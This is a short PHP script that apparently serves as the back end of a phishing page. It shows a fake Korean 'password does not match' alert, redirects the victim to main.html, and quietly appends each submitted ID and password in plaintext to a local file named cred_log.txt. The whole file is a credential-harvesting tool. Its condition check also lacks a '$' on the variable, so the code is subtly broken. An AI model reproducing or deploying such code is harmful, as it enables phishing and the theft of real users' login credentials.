<?php

echo "<script>alert('비밀번호가 일치하지 않습니다.');</script>";
echo "<script>location.href='main.html'</script>";
$id_value = $_POST['id'];
$pw_value = $_POST['pw'];


if (!empty(id_value)) {
  $file = fopen('cred_log.txt', 'a+');
  fwrite($file, "[1] ID : " . $id_value . " / PW : " . $pw_value . "\n");
  fclose($file);
  //header('Location:main.html');
}

?>
